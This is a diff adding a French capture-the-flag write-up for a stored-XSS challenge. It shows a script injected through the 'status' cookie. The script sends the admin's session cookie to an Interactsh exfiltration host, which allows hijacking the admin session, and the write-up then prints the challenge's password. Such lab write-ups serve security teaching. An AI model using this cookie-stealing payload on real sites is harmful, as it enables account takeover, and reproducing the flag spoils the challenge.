@@ -429,3 +429,72 @@ PortSwigger recommande donc :
 
 - **PortSwigger – Preventing **CSRF** vulnerabilities**  
   [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
+  # Challenge 9–  XSS - Stockée 2
+  ## Analyse initiale du site
+  En arrivant sur le forum, j’ai d’abord testé le fonctionnement normal en soumettant un message simple :
+   -Titre : test
+   -Message : test
+  ## Observation de la requête avec Burp
+  En envoyant un message, j’intercepte via Burp une requête :
+  ```
+  POST /web-client/ch19/ HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Cookie: status=invite
+ ```
+  
+Je remarque un élément intéressant :
+👉 Le cookie status semble indiquer si l’utilisateur est invite ou admin.
+👉 Il est potentiellement réinjecté dans la page sans filtrage, ce qui suggère une possible vulnérabilité XSS
+
+  ## Hypothèse : XSS via la valeur du cookie
+
+Si la valeur du cookie status est affichée directement dans le HTML, alors en modifiant cette valeur pour y insérer du JavaScript, le script pourra être exécuté dans le navigateur…
+Et surtout, dans le navigateur de l’administrateur, lorsqu’il affichera la page.
+
+C’est une XSS stockée via cookie injection.
+ ## Construction du payload XSS
+J’utilise Interactsh pour récupérer les cookies volés (serveur d’exfiltration).
+https://app.interactsh.com/#/
+Je mets mon identifiant Interactsh dans un payload JavaScript :
+ ```
+<script>
+document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie
+</script>
+ ```
+Ensuite, j’injecte ce payload dans la valeur du cookie status dans Burp Repeater :
+ ```
+Cookie: status=aaaa"><script>document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie</script>;
+ ```
+Puis j’envoie la requête modifiée.
+## Déclenchement de l’attaque
+
+Quand l’administrateur visite la page du forum :
+-le site réinjecte status dans le HTML,
+-mon JavaScript est exécuté dans son navigateur,
+-son cookie de session est envoyé sur mon serveur Interactsh.
+
+Dans Interactsh, je vois une requête contenant :
+```
+?c=PHPSESSID=XXXXXXXXXXXX
+```
+
+🎉 Je possède maintenant le cookie admin.
+## Usurpation de la session administrateur
+
+Dans mon navigateur :
+
+-Je vais dans Storage / Cookies.
+-Je remplace ma valeur PHPSESSID par celle volée.
+-Je recharge la page.
+
+Je suis maintenant authentifiée comme admin.
+## Accès à la section d’administration
+
+En me rendant sur ?section=admin, le site m’affiche :
+```
+Vous pouvez valider ce challenge avec ce mot de passe :
+E5HKEGyCXQVsYaehaqeJs0AfV
+```
+
+👉 C’est la solution du challenge.
+
